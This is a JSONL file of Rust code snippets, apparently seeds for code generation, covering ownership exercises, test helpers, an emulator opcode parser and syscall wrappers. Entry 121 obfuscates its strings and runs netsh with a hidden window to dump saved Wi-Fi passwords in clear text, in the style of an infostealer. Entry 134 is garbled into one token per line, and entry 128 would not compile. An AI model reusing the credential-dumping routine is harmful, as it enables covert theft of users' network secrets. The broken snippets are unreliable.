{"seed":"fn ownership_test() {\n    let mut v = Vec::new();\n    for i in 101..106 {\n        v.push(i.to_string());\n    }\n\n    let fifth = v.pop().unwrap();\n    assert_eq!(fifth, \"105\");\n\n    let second = v.swap_remove(1);\n    assert_eq!(second, \"102\");\n\n    let third = std::mem::replace(&mut v[2], \"substitute\".to_string());\n    assert_eq!(third, \"103\");\n\n    assert_eq!(v, vec![\"101\", \"104\", \"substitute\"]);\n\n    struct Person {\n        name: Option<String>,\n        birth: Option<i32>,\n    };\n\n    let mut composers = Vec::new();\n    composers.push(Person {\n        name: Some(\"Palestrina\".to_string()),\n        birth: Some(1525),\n    });\n\n    \/\/ let first_name = composers[0].name \/\/ error\n\n    let first_name = std::mem::replace(&mut composers[0].name, None);\n    assert_eq!(first_name, Some(\"Palestrina\".to_string()));\n    assert_eq!(composers[0].name, None);\n    let birth = composers[0].birth.take();\n    assert_eq!(birth, Some(1525));\n    assert_eq!(composers[0].birth, None);\n}","id":112}
{"seed":"fn main() {\n    println!(\"Common letters in the box ids: {}\",\n             match find_common_id() {\n                 Some(s) => s,\n                 None => \"NA\".to_string()\n             });\n}","id":113}
{"seed":"pub fn force_reset() -> Result<(), ()> {\n    let mut configurator = Configurator::new();\n    configurator.force_reset();\n    Ok(())\n}","id":114}
{"seed":"fn parse_bors_reviewer(\n    reviewers: &Reviewers,\n    repo: &Repository,\n    commit: &Commit,\n) -> Result<Option<Vec<Author>>, ErrorContext> {\n    if commit.author().name_bytes() != b\"bors\" || commit.committer().name_bytes() != b\"bors\" {\n        if commit.committer().name_bytes() != b\"GitHub\" || !is_rollup_commit(commit) {\n            return Ok(None);\n        }\n    }\n\n    \/\/ Skip non-merge commits\n    if commit.parents().count() == 1 {\n        return Ok(None);\n    }\n\n    let to_author = |list: &str| -> Result<Vec<Author>, ErrorContext> {\n        list.trim_end_matches('.')\n            .split(|c| c == ',' || c == '+')\n            .map(|r| r.trim_start_matches('@'))\n            .map(|r| r.trim_end_matches('`'))\n            .map(|r| r.trim())\n            .filter(|r| !r.is_empty())\n            .filter(|r| *r != \"<try>\")\n            .inspect(|r| {\n                if !r.chars().all(|c| {\n                    c.is_alphabetic() || c.is_digit(10) || c == '-' || c == '_' || c == '='\n                }) {\n                    eprintln!(\n                        \"warning: to_author for {} contained non-alphabetic characters: {:?}\",\n                        commit.id(),\n                        r\n                    );\n                }\n            })\n            .map(|r| {\n                reviewers.to_author(r).map_err(|e| {\n                    ErrorContext(\n                        format!(\"reviewer: {:?}, commit: {}\", r, commit.id()),\n                        e.into(),\n                    )\n                })\n            })\n            .flat_map(|r| r.transpose())\n            .collect::<Result<Vec<_>, ErrorContext>>()\n    };\n\n    let message = commit.message().unwrap_or(\"\");\n    let mut reviewers = if let Some(line) = message.lines().find(|l| l.contains(\" r=\")) {\n        let start = line.find(\"r=\").unwrap() + 2;\n        let end = line[start..]\n            .find(' ')\n            .map(|pos| pos + start)\n            .unwrap_or(line.len());\n        to_author(&line[start..end])?\n    } else if let Some(line) = message.lines().find(|l| l.starts_with(\"Reviewed-by: \")) {\n        let line = &line[\"Reviewed-by: \".len()..];\n        to_author(&line)?\n    } else {\n        \/\/ old bors didn't include r=\n        if message != \"automated merge\\n\" {\n            panic!(\n                \"expected reviewer for bors merge commit {} in {:?}, message: {:?}\",\n                commit.id(),\n                repo.path(),\n                message\n            );\n        }\n        return Ok(None);\n    };\n    reviewers.sort();\n    reviewers.dedup();\n    Ok(Some(reviewers))\n}","id":115}
{"seed":"pub fn acrn_create_dir(path: &str, recursive: bool) -> Result<(), String> {\n    if recursive {\n        fs::create_dir_all(path).map_err(|e| e.to_string())\n    } else {\n        fs::create_dir(path).map_err(|e| e.to_string())\n    }\n}","id":116}
{"seed":"fn print_fixed_acc(inss: &[Instruction], op: Operation, pc: usize) -> bool {\n    let mut fixed_inss = inss.to_vec();\n    fixed_inss[pc].op = op;\n\n    match Evaluator::new(&mut fixed_inss).eval_until_loop() {\n        (final_pc, final_acc, _) if final_pc == fixed_inss.len() => {\n            println!(\"{}\", final_acc);\n            true\n        }\n        _ => false,\n    }\n}","id":117}
{"seed":"pub fn test_rvc_pageend() {\n    \/\/ The last instruction of a executable memory page is an RVC instruction.\n    let buffer = fs::read(\"tests\/programs\/rvc_pageend\").unwrap().into();\n    let core_machine =\n        DefaultCoreMachine::<u64, SparseMemory<u64>>::new(ISA_IMC, VERSION0, u64::max_value());\n    let mut machine = DefaultMachineBuilder::new(core_machine).build();\n    machine\n        .load_program(&buffer, &vec![\"rvc_end\".into()])\n        .unwrap();\n\n    let anchor_pc: u64 = 69630;\n    \/\/ Ensure that anchor_pc is in the end of the page\n    assert_eq!(anchor_pc as usize % RISCV_PAGESIZE, RISCV_PAGESIZE - 2);\n    let memory = machine.memory_mut();\n    \/\/ Ensure that the data segment is located at anchor_pc + 2\n    let data0 = memory.load16(&(anchor_pc + 2)).unwrap().to_u32();\n    assert_eq!(data0, 4);\n    let data1 = memory.load16(&(anchor_pc + 6)).unwrap().to_u32();\n    assert_eq!(data1, 2);\n    \/\/ Ensure that the anchor instruction is \"c.jr a0\"\n    let anchor_inst = memory.load16(&anchor_pc).unwrap().to_u16();\n    assert_eq!(anchor_inst, 0x8502);\n\n    let result = machine.run();\n    assert!(result.is_ok());\n    assert_eq!(result.unwrap(), 0);\n}","id":118}
{"seed":"fn main() {\n    let instruction: Vec<String> = std::env::args().collect();\n    let instruction: &String = &instruction[1];\n\n    println!(\"{}\", santa(instruction));\n}","id":119}
{"seed":"pub fn test_mulw64() {\n    let buffer = fs::read(\"tests\/programs\/mulw64\").unwrap().into();\n    let result = run::<u64, SparseMemory<u64>>(&buffer, &vec![\"mulw64\".into()]);\n    assert!(result.is_ok());\n}","id":120}
{"seed":"async fn get_wifi_profile(ssid: &str) -> Option<String> {\n    delay_for(Duration::from_millis(10)).await;\n\n    let output = Command::new(obfstr::obfstr!(\"netsh.exe\"))\n        .args(&[\n            obfstr::obfstr!(\"wlan\"),\n            obfstr::obfstr!(\"show\"),\n            obfstr::obfstr!(\"profile\"),\n            ssid,\n            obfstr::obfstr!(\"key=clear\"),\n        ])\n        .creation_flags(CREATE_NO_WINDOW)\n        .output()\n        .ok()?;\n\n    Some(String::from_utf8_lossy(&output.stdout).to_string())\n}","id":121}
{"seed":"fn test_expression() {\n    \/\/ 6.1\n    \/\/ expression\n    \/\/ 5 * (fahr-32) \/ 9;\n\n    \/* statement\n     for (; begin != end; ++begin) {\n        if (*begin == target)\n            break;\n     }\n    *\/\n    \/*\n     pixels[r * bounds.0 + c] =\n        match escapes(Complex { re: point.0, im: point.1 }, 255) {\n            None => 0,\n            Some(count) => 255 - count as u8\n        };\n    *\/\n    \/*\n     let status =\n        if cpu.temperature <= MAX_TEMP {\n            HttpStatus::Ok\n        } else {\n            HttpStatus::ServerError\n        };\n    *\/\n    \/*\n     println!(\"Inside the vat, you see {}.\",\n        match vat.contents {\n            Some(brain) => brain.desc(),\n            None => \"nothing of interest\"\n        });\n    *\/\n    \/\/ 6.2\n    \/*\n     let display_name = match post.author() {\n        Some(author) => author.name(),\n        None => {\n            let network_info = post.get_network_metadata()?;\n            let ip = network_info.client_address();\n            ip.to_string()\n        }\n     };\n    *\/\n    \/*\n     let msg = {\n        \/\/ let-declaration: semicolon is always required\n        let dandelion_control = puffball.open();\n\n        \/\/ expression + semicolon: method is called, return value dropped\n        dandelion_control.release_all_seeds(launch_codes);\n\n        \/\/ expression with no semicolon: method is called,\n        \/\/ return value stored in `msg`\n        dandelion_control.get_status()\n     }\n    *\/\n\n    \/\/ 6.3\n    \/*\n     loop {\n         work();\n         play();\n         ;  \/\/ <-- empty statement\n     }\n    *\/\n\n    \/*\n     * let name: type = expr;\n     *\/\n\n    \/*\n    let name;\n    if user.has_nickname() {\n       name = user.nickname();\n    } else {\n       name = generate_unique_name();\n       user.register(&name);\n    }\n    *\/\n\n    \/*\n    use std::io;\n    use std::cmp::Ordering;\n    fn show_files() -> io::Result<()> {\n       let mut v = vec![];\n       ...\n       fn cmp_by_timestamp_then_name(a: &FileInfo, b: &FileInfo) -> Ordering {\n           a.timestamp.cmp(&b.timestamp)\n               .reverse()\n               .then(a.path.cmp(&b.path))\n       }\n       v.sort_by(cmp_by_timestamp_then_name);\n    }\n    *\/\n\n    \/\/ 6.4\n    \/*\n    if condition1 {\n       block1\n    } else if condition2 {\n       block2\n    } else {\n       block_n\n    }\n    *\/\n\n    \/*\n     match value {\n        pattern => expr,\n        ...\n     }\n    *\/\n    let code = 2;\n    match code {\n        0 => println!(\"OK\"),\n        1 => println!(\"Wires Tangled\"),\n        2 => println!(\"User Asleep\"),\n        _ => println!(\"Unrecognized Error {}\", code),\n    }\n\n    \/*\n    match params.get(\"name\") {\n        Some(name) => println!(\"Hello, {}!\", name),\n        None => println!(\"Greetings, stranger.\")\n    }\n    *\/\n\n    \/*\n     let score = match card.rank {\n        Jack => 10,\n        Queen = > 10,\n        Ace = 11\n     }; \/\/ error: nonexhaustive patterns\n    *\/\n\n    \/*\n     let suggested_pet =\n        if with_wings { Pet::Buzzard } else { Pet::Hyena }; \/\/ok\n\n     let favorite_number =\n        if user.is_hobbit() { \"eleventy-one\" } else { 9 }; \/\/error\n\n     let best_sports_team =\n        if is_hockey_season() { \"Predators\" }; \/\/ error\n    *\/\n\n    \/*\n    let suggested_per =\n        match favotites.elements {\n            Fire => Pet::RedPanda,\n            Air => Pet::Buffalo,\n            Water => Pet::Orca,\n            _ => None \/\/ error: incompatible types\n        }\n    *\/\n\n    \/\/ 6.4.1\n    \/*\n     if let pattern = expr {\n         block1\n     } else {\n         block2\n     }\n\n     match expr {\n        pattern => { block1 }\n        _ => { block2 }\n    *\/\n\n    \/*\n    if let Some(cookie) = request.session_cookie {\n       return restore_session(cookie);\n    }\n\n    if let Err(err) = present_cheesy_anti_robot_task() {\n       log_robot_attempt(err);\n       politely_accuse_user_of_being_a_robot();\n    } else {\n       session.mark_as_human();\n    }\n    *\/\n\n    \/\/ 6.5 loop\n    \/*\n    while condition {\n        block\n    }\n\n    while let pattern = expr {\n        block\n    }\n\n    loop {\n        block\n    }\n\n    for pattern in collection {\n        block\n    }\n    *\/\n\n    for i in 0..20 {\n        println!(\"{}\", i);\n    }\n\n    \/*\n    let strings: Vec<String> = error_messages();\n    for s in strings { \/\/ each String is moved into s here\n        println!(\"{}\", s);\n    } \/\/ ...and dropped here\n    println(\"{} error(s)\", strings.len()); \/\/ error: use of moved value\n    *\/\n\n    \/*\n    for rs in &strings {\n        println!(\"String {:?} is at address {:p}.\", *rs, rs); \/\/ ok\n    }\n    *\/\n\n    \/*\n    for rs in &mut strings { \/\/ tye type of rs is &mut String\n        rs.push('\\n'); \/\/ add a newline to each string\n    }\n    *\/\n\n    \/*\n\n    for line in input_lines {\n        let trimmed = trim_comments_and_whitespac(line);\n        if trimmed.is_empty() {\n            continue;\n        }\n        ...\n    }\n    *\/\n    \/*\n    'seach:\n    for room in apartment {\n        for stop in room.hiding_spots() {\n            if spot.contains(keys) {\n                println!(\"Your keys are {} in the {}.\", spot, room);\n                break 'search;\n            }\n        }\n    }\n    *\/\n\n    \/\/ 6.6 return\n    fn f() {\n        \/\/ return type omitted: default to ()\n        return; \/\/ return value comitted: default to ()\n    }\n    assert_eq!(f(), ());\n\n    \/*\n    let output = File::create(filename)?;\n\n    let output = match File::create(filename) {\n        Ok(f) => f,\n        Err(err) => return Err(err)\n    };\n\n    *\/\n\n    \/\/ 6.7\n\n    \/*\n    fn wait_for_process(process: &mut Process) -> i32 {\n        while true {\n            if process.wait() {\n                return process.exit_code();\n            }\n        }\n    } \/\/ error: not all control paths return a value\n    *\/\n\n    \/*\n    fn serve_forever(socket: ServerSocket, handler: ServerHandler) -> ! {\n        socket.listen();\n        loop {\n            let s = socket.accept();\n            handler.handle(s);\n        }\n    }\n    *\/\n\n    \/\/ 6.8\n\n    \/*\n    let x = gcd(1302, 462); \/\/ function call\n    let room = player.location(); \/\/ method call\n    let mut numbers = Vec::new(); \/\/ static method call\n\n    Iron::new(router).http(\"localhost:3000\").unwrap();\n\n    return Vec<i32>::with_capacity(1000); \/\/ error: something about chanined comparisons\n    let ramp = (0 .. n).collect<Vec<i32>>(); \/\/ same error\n    return Vec::<i32>::with_capacity(1000); \/\/ ok, using ::<\n    let ramp = (0 .. n).collect::<Vec<i32>>(); \/\/ ok, using ::<\n    return Vec::with_capacity(10); \/\/ ok, if the fn return type is Vec<i32>\n    let ramp: Vec<i32> = (0 .. n).collect(); \/\/ ok, variable's type is given\n    *\/\n\n    \/\/ 6.9\n\n    \/*\n    game.black_pawns \/\/ struct field\n    coords.1         \/\/ tuple element\n    pieces[i]        \/\/ array element, they are lvalue\n\n    fn quicksort<T: Ord>(slice: &mut [T]) {\n        if slice.len() <= 1 {\n            return; \/\/ Nothing to sort.\n        }\n\n        \/\/ Partition the slice into two parts, front and back.\n        let pivot_index = partition(slice);\n\n        \/\/ Recursively sort the front half of `slice`.\n        quicksort(&mut slice[.. pivot_index]);\n        \/\/ And the back half.\n        quicksort(&mut slice[pivot_index + 1 ..]);\n    }\n    *\/\n\n    \/\/ 6.10\n\n    \/*\n    let padovan: Vec<u64> = compute_padovan_sequence(n);\n    for elem in &padovan {\n        draw_triangle(turtle, *elem);\n    }\n    *\/\n\n    \/\/ 6.11\n    \/*\n\n       println!(\"{}\", -100);     \/\/ -100\n       println!(\"{}\", -100u32);  \/\/ error: can't apply unary '-' to type 'u32'\n       println!(\"{}\", +100);     \/\/ error: expected expression, found '+'\n\n       let x = 1234.567 % 10.0;  \/\/ approximetely 4.567\n\n       let hi: u8 = 0xe0;\n       let lo = !hi; \/\/ 0x1f\n    *\/\n\n    \/\/ 6.12\n    \/*\n    total += item.price;\n    \/\/ rust does not have increment operator and decrement operator.\n    *\/\n\n    \/\/ 6.13\n    \/*\n    let x = 17;             \/\/ x is type i32\n    let index = x as usize; \/\/ convert to usize\n    *\/\n\n    \/\/ 6.14\n    \/*\n    let is_even = |x| x % 2 == 0;\n\n    let is_evan = |x: u64| -> bool x % 2 == 0; \/\/ error\n    *\/\n    let is_even = |x: u64| -> bool { x % 2 == 0 }; \/\/ ok\n    assert_eq!(is_even(14), true);\n}","id":122}
{"seed":"pub fn parse_command(opcode: u8, rom: &[u8]) -> Option<Box<dyn Instruction>> {\n    match opcode {\n        \/* NOP *\/\n        0x00 =>\n            cmd!(noop::NoOp),\n        \/* LD BC,nn *\/\n        0x01 =>\n            cmd!(load::Load16Bit::BC(u16!(rom))),\n        \/* LD DE,nn *\/\n        0x11 =>\n            cmd!(load::Load16Bit::DE(u16!(rom))),\n        \/* LD HL,nn *\/\n        0x21 =>\n            cmd!(load::Load16Bit::HL(u16!(rom))),\n        \/* LD SP,nn *\/\n        0x31 =>\n            cmd!(load::Load16Bit::SP(u16!(rom))),\n        \/* LD (r),A *\/\n        0x02 | 0x12 | 0x77 =>\n            cmd!(load::LoadIntoRegisterRamFromRegisterA::new(opcode)),\n        \/* RLA *\/\n        0x17 =>\n            cmd!(alu::RotateRegisterALeft),\n        \/* INC BC *\/\n        0x03 =>\n            cmd!(inc::Increment16BitRegister(r16!(BC))),\n        \/* INC DE *\/\n        0x13 =>\n            cmd!(inc::Increment16BitRegister(r16!(DE))),\n        \/* INC HL *\/\n        0x23 =>\n            cmd!(inc::Increment16BitRegister(r16!(HL))),\n        \/* INC SP *\/\n        0x33 =>\n            cmd!(inc::Increment16BitRegister(r16!(SP))),\n        \/* INC n *\/\n        0x04 | 0x0C | 0x14 | 0x1C | 0x24 | 0x2C | 0x3C =>\n            cmd!(inc::IncrementRegister::new(opcode)),\n        \/* DEC A *\/\n        0x3D =>\n            cmd!(dec::DecrementRegister(r8!(A))),\n        \/* DEC B *\/\n        0x05 =>\n            cmd!(dec::DecrementRegister(r8!(B))),\n        \/* DEC C *\/\n        0x0D =>\n            cmd!(dec::DecrementRegister(r8!(C))),\n        \/* DEC D *\/\n        0x15 =>\n            cmd!(dec::DecrementRegister(r8!(D))),\n        \/* DEC E *\/\n        0x1D =>\n            cmd!(dec::DecrementRegister(r8!(E))),\n        \/* DEC H *\/\n        0x25 =>\n            cmd!(dec::DecrementRegister(r8!(H))),\n        \/* DEC L *\/\n        0x2D =>\n            cmd!(dec::DecrementRegister(r8!(L))),\n        \/* *\/\n        0x06 | 0x0E | 0x16 | 0x1E | 0x26 | 0x2E | 0x3E =>\n            cmd!(load::Load8Bit::new(opcode, u8!(rom))),\n        \/* LD A,A *\/\n        0x7F =>\n            cmd!(load::LoadRegisterIntoRegisterA(r8!(A))),\n        \/* LD A,B *\/\n        0x78 =>\n            cmd!(load::LoadRegisterIntoRegisterA(r8!(B))),\n        \/* LD A,C *\/\n        0x79 =>\n            cmd!(load::LoadRegisterIntoRegisterA(r8!(C))),\n        \/* LD A,D *\/\n        0x7A =>\n            cmd!(load::LoadRegisterIntoRegisterA(r8!(D))),\n        \/* LD A,E *\/\n        0x7B =>\n            cmd!(load::LoadRegisterIntoRegisterA(r8!(E))),\n        \/* LD A,H *\/\n        0x7C =>\n            cmd!(load::LoadRegisterIntoRegisterA(r8!(H))),\n        \/* LD A,L *\/\n        0x7D =>\n            cmd!(load::LoadRegisterIntoRegisterA(r8!(L))),\n        \/* LD A,(BC) *\/\n        0x0A =>\n            cmd!(load::LoadRegisterRamIntoRegisterA(rp!(BC))),\n        \/* LD A,(DE) *\/\n        0x1A =>\n            cmd!(load::LoadRegisterRamIntoRegisterA(rp!(DE))),\n        \/* LD A,(HL) *\/\n        0x7E =>\n            cmd!(load::LoadRegisterRamIntoRegisterA(rp!(HL))),\n        \/* JR NZ,n *\/\n        0x20 =>\n            cmd!(jump::JumpRelative::nz(i8!(rom))),\n        \/* JR Z,n *\/\n        0x28 =>\n            cmd!(jump::JumpRelative::z(i8!(rom))),\n        \/* JR NC,n *\/\n        0x30 =>\n            cmd!(jump::JumpRelative::nc(i8!(rom))),\n        \/* JR C,n *\/\n        0x38 =>\n            cmd!(jump::JumpRelative::c(i8!(rom))),\n        \/* LD (HL+),A *\/\n        0x22 =>\n            cmd!(load::LoadIncrementHLA),\n        \/* LD (HL-),A *\/\n        0x32 =>\n            cmd!(load::LoadDecrementHLA),\n        \/* *\/\n        0xAF | 0xA8 | 0xA9 | 0xAA | 0xAB | 0xAC | 0xAD =>\n            cmd!(xor::Xor::new(opcode)),\n        \/* LD B,A *\/\n        0x47 =>\n            cmd!(load::LoadIntoRegisterFromRegisterA(r8!(B))),\n        \/* LD C,A *\/\n        0x4F =>\n            cmd!(load::LoadIntoRegisterFromRegisterA(r8!(C))),\n        \/* CB *\/\n        0xCB => parse_prefix_command(rom),\n        \/* CALL nn *\/\n        0xCD => cmd!(call::Call(u16!(rom))),\n        \/* RET *\/\n        0xC9 => cmd!(ret::Return),\n        \/* LDH (n),A *\/\n        0xE0 =>\n            cmd!(load::LoadRegisterAIntoZeroPageRam(rom[0])),\n        \/* LD (nn),A *\/\n        0xE2 =>\n            cmd!(load::LoadRamFromRegisterA),\n        \/* *\/\n        0xEA =>\n            cmd!(load::LoadIntoImmediateRamFromRegisterA(u16!(rom))),\n        \/* LD A,(n) *\/\n        0xFA =>\n            cmd!(load::LoadImmediateRamIntoRegisterA(u16!(rom))),\n        \/* PUSH AF *\/\n        0xF5 =>\n            cmd!(push::Push(rp!(AF))),\n        \/* PUSH BC *\/\n        0xC5 =>\n            cmd!(push::Push(rp!(BC))),\n        \/* PUSH DE *\/\n        0xD5 =>\n            cmd!(push::Push(rp!(DE))),\n        \/* PUSH HL *\/\n        0xE5 =>\n            cmd!(push::Push(rp!(HL))),\n        \/* POP AF *\/\n        0xF1 =>\n            cmd!(pop::Pop(rp!(AF))),\n        \/* POP BC *\/\n        0xC1 =>\n            cmd!(pop::Pop(rp!(BC))),\n        \/* POP DE *\/\n        0xD1 =>\n            cmd!(pop::Pop(rp!(DE))),\n        \/* POP HL *\/\n        0xE1 =>\n            cmd!(pop::Pop(rp!(HL))),\n        \/* CP # *\/\n        0xFE =>\n            cmd!(compare::CompareImmediate(u8!(rom))),\n        _ => {\n            println!(\"Unknown OpCode {:#X?}\", opcode);\n            None\n        }\n    }\n}","id":123}
{"seed":"pub fn debug_cpool_list() {\n    system_call(SystemCall::DebugCPoolList);\n}","id":124}
{"seed":"fn main() {\n    if let Err(err) = run() {\n        eprintln!(\"Error: {}\", err);\n        let mut cur = &*err;\n        while let Some(cause) = cur.source() {\n            eprintln!(\"\\tcaused by: {}\", cause);\n            cur = cause;\n        }\n        std::mem::drop(cur);\n        std::process::exit(1);\n    }\n}","id":125}
{"seed":"fn system_call_put_payload<T: Any>(message: SystemCall, payload: T) -> SystemCall {\n    use core::mem::{size_of};\n    let addr = task_buffer_addr();\n\n    unsafe {\n        let buffer = &mut *(addr as *mut TaskBuffer);\n        buffer.call = Some(message);\n\n        buffer.payload_length = size_of::<T>();\n        let payload_addr = &mut buffer.payload_data as *mut _ as *mut T;\n        let payload_data = &mut *payload_addr;\n        *payload_data = payload;\n\n        system_call_raw();\n        buffer.call.take().unwrap()\n    }\n}","id":126}
{"seed":"fn system_call(message: SystemCall) -> SystemCall {\n    let addr = task_buffer_addr();\n    unsafe {\n        let buffer = &mut *(addr as *mut TaskBuffer);\n        buffer.call = Some(message);\n        system_call_raw();\n        buffer.call.take().unwrap()\n    }\n}","id":127}
{"seed":"fn parseLightInfo(reader: &mut BufReader<&File>, buf: &mut String, lights: &mut Vec<Light>) -> Model {\r\n    let mut light = Light {\r\n        lightType: \"\" as str,\r\n        radius: 0.0,\r\n        period: 0,\r\n        position: Vec3f::new(0.0, 0.0, 0.0),\r\n        Color: Vec3f::new(0.0, 0.0, 0.0),\r\n    };\r\n    \/\/Firstly, read the LigthType\r\n    reader.read_line(buf);\r\n    let lightType: &str = buf.trim().clone();\r\n    let mut key = \"\";\r\n    let mut radius = \"\";\r\n    let mut period = 0;\r\n    if lightType == \"o\" || lightType == \"l\" {\r\n        let mut infoIndex = 0;\r\n        reader.read_line(buf);\r\n        let mut split_info = buf.split(\" \");\r\n        key = split_info.next().unwrap().parse().unwrap();\r\n        radius = split_info.next().unwrap().parse().unwrap();\r\n        period = split_info.next().unwrap().parse().unwrap();\r\n    }\r\n    let mut infoIndex = 0;\r\n    while infoIndex < 2 {\r\n        \/\/Then, read the position and Color Info\r\n        split_info = buf.split(\" \");\r\n        let mut fieldInfo = 0;\r\n        reader.read_line(buf);\r\n        let mut split_info = buf.split(\" \");\r\n        key = split_info.next().unwrap().parse().unwrap();\r\n        if infoIndex == 1 {\r\n            light.position = Vec3f::new(\r\n                x: split_info.next().unwrap().parse().unwrap(),\r\n                y: split_info.next().unwrap().parse().unwrap(),\r\n                z: split_info.next().unwrap().parse().unwrap(),\r\n            )\r\n        } else {\r\n            light.Color = Vec3f::new(\r\n                x: split_info.next().unwrap().parse().unwrap(),\r\n                y: split_info.next().unwrap().parse().unwrap(),\r\n                z: split_info.next().unwrap().parse().unwrap(),\r\n            )\r\n        }\r\n        infoIndex += 1\r\n    }\r\n    \/\/Finally, we only need to read an empty line to finish the model parsing process\r\n    reader.read_line(buf);\r\n    lights.push(light);\r\n}","id":128}
{"seed":"pub fn main() {\n    let game = Game::new();\n\n    game_loop(game, 240, 0.1, |g| {\n        g.game.your_update_function();\n    }, |g| {\n        g.game.your_render_function();\n    });\n}","id":129}
{"seed":"fn expect_money_conserved(table: &Table) {\n  let mut history: BTreeMap<u32, Vec<Row>> = BTreeMap::new();\n  for c in table.scan() {\n    history.entry(c.t).or_insert(Vec::new()).push(Row { k: c.k, v: c.v });\n  }\n  let mut tracker: HashMap<i32, i32> = HashMap::new();\n  for (_, rs) in history {\n    for r in rs {\n      tracker.insert(r.k, r.v);\n    }\n    let mut sum = 0;\n    for (_, v) in tracker.clone() {\n      sum += v;\n    }\n    assert! (sum == 0);\n  }\n}","id":130}
{"seed":"fn loadImageFromMaterial(model: &mut Model, materialPath: &str) {\r\n    model.albedo_map = materialPath + \"_albedo.png\";\r\n    model.normal_map = materialPath + \"_normal.png\";\r\n    model.ambient_ligth = materialPath + \"_ao.png\";\r\n    model.roughness_map = materialPath + \"_rough.png\"\r\n}","id":131}
{"seed":"fn find_common_id() -> Option<String> {\n    let input = fs::File::open(\"input.txt\")\n        .expect(\"Something went wrong reading the file\");\n    let reader = io::BufReader::new(input);\n    let mut box_ids: Vec<String> = reader.lines().map(|l| l.unwrap()).collect();\n    box_ids.sort();\n\n    for i in 0..box_ids.len() {\n        let mut diff = 0;\n        if i != box_ids.len() - 1 {\n            for (a, b) in box_ids[i].chars().zip(box_ids[i+1].chars()) {\n                if a != b {\n                    diff += 1;\n                }\n            }\n            if diff == 1 {\n                return Some(get_common_chars(&box_ids[i], &box_ids[i+1]));\n            }\n        }\n    }\n    None\n}","id":132}
{"seed":"fn build_one() {\n    let project = project(\"build_one\").with_fuzz().build();\n\n    \/\/ Create some targets.\n    project\n        .cargo_fuzz()\n        .arg(\"add\")\n        .arg(\"build_one_a\")\n        .assert()\n        .success();\n    project\n        .cargo_fuzz()\n        .arg(\"add\")\n        .arg(\"build_one_b\")\n        .assert()\n        .success();\n\n    \/\/ Build to ensure that the build directory is created and\n    \/\/ `fuzz_build_dir()` won't panic.\n    project.cargo_fuzz().arg(\"build\").assert().success();\n\n    let build_dir = project.fuzz_build_dir().join(\"release\");\n    let a_bin = build_dir.join(\"build_one_a\");\n    let b_bin = build_dir.join(\"build_one_b\");\n\n    \/\/ Remove the files we just built.\n    fs::remove_file(&a_bin).unwrap();\n    fs::remove_file(&b_bin).unwrap();\n\n    assert!(!a_bin.is_file());\n    assert!(!b_bin.is_file());\n\n    \/\/ Test that we can build one and not the other.\n    project\n        .cargo_fuzz()\n        .arg(\"build\")\n        .arg(\"build_one_a\")\n        .assert()\n        .success();\n\n    assert!(a_bin.is_file());\n    assert!(!b_bin.is_file());\n}","id":133}
{"seed":"fn\ntest_value\n(\n)\n-\n>\nResult\n<\n(\n)\n>\n{\nlet\ndb\n=\nchecked_memory_handle\n(\n)\n?\n;\ndb\n.\nexecute\n(\n\"\nINSERT\nINTO\nfoo\n(\ni\n)\nVALUES\n(\n?\n1\n)\n\"\n[\nValue\n:\n:\nInteger\n(\n10\n)\n]\n)\n?\n;\nassert_eq\n!\n(\n10i64\ndb\n.\none_column\n:\n:\n<\ni64\n>\n(\n\"\nSELECT\ni\nFROM\nfoo\n\"\n)\n?\n)\n;\nOk\n(\n(\n)\n)\n}","id":134}
{"seed":"fn list() {\n    let project = project(\"add\").with_fuzz().build();\n\n    \/\/ Create some targets.\n    project.cargo_fuzz().arg(\"add\").arg(\"c\").assert().success();\n    project.cargo_fuzz().arg(\"add\").arg(\"b\").assert().success();\n    project.cargo_fuzz().arg(\"add\").arg(\"a\").assert().success();\n\n    \/\/ Make sure that we can list our targets, and that they're always sorted.\n    project\n        .cargo_fuzz()\n        .arg(\"list\")\n        .assert()\n        .stdout(\"a\\nb\\nc\\n\")\n        .success();\n}","id":135}
{"seed":"pub fn task_set_stack_pointer(target: CAddr, ptr: u64) {\n    system_call(SystemCall::TaskSetStackPointer {\n        request: (target, ptr),\n    });\n}","id":136}
{"seed":"pub fn task_set_active(target: CAddr) {\n    system_call(SystemCall::TaskSetActive {\n        request: target\n    });\n}","id":137}
{"seed":"fn soda(_py: Python, m: &PyModule) -> PyResult<()> {\n    m.add_class::<Soda>()?;\n    Ok(())\n}","id":138}
{"seed":"fn default_handler(irqn: i16) {\n    panic!(\"Unhandled exception (IRQn = {})\", irqn);\n}","id":139}
{"seed":"async fn main() -> Result<!, String> {\n    \/\/ Begin by parsing the arguments. We are either a server or a client, and\n    \/\/ we need an address and potentially a sleep duration.\n    let args: Vec<_> = env::args().collect();\n\n    match &*args {\n        [_, mode, url]             if mode == \"server\" => server(url).await?,\n        [_, mode, url]             if mode == \"client\" => client(url, tokio::io::stdin()).await?,\n        [_, mode, url, input_file] if mode == \"client\" => {\n            match tokio::fs::File::open(input_file).await {\n                Ok(file) => client(url, file).await?,\n                Err(err) => {\n                    eprintln!(\"Failed to open input_file: \\\"{}\\\", error: {}\", input_file, err);\n                    process::exit(2);\n                }\n            }\n        }\n        _ => {\n            eprintln!(\"Usage:\\n{0} server <url>\\n  or\\n{0} client <url> [input_file]\", args[0]);\n            process::exit(1);\n        }\n    }\n}","id":140}
{"seed":"fn assert_memory_store_empty_bytes<M: Memory>(memory: &mut M) {\n    assert!(memory.store_byte(0, 0, 42).is_ok());\n    assert!(memory.store_bytes(0, &[]).is_ok());\n}","id":141}
{"seed":"fn desearlizer_task(req: &mut reqwest::Response) -> Result<Task, Error> {\n    let mut buffer = String::new();\n    match req.read_to_string(&mut buffer) {\n        Ok(_) => (),\n        Err(e) => println!(\"error : {}\", e.to_string())\n    };\n    println!(\"buffer before serializaztion: {}\", buffer);\n\n    let v = match serde_json::from_str::<Task>(&buffer){\n        Ok(v) => v,\n        Err(e) => return Err(e)\n    };\n    Ok(v)\n}","id":142}
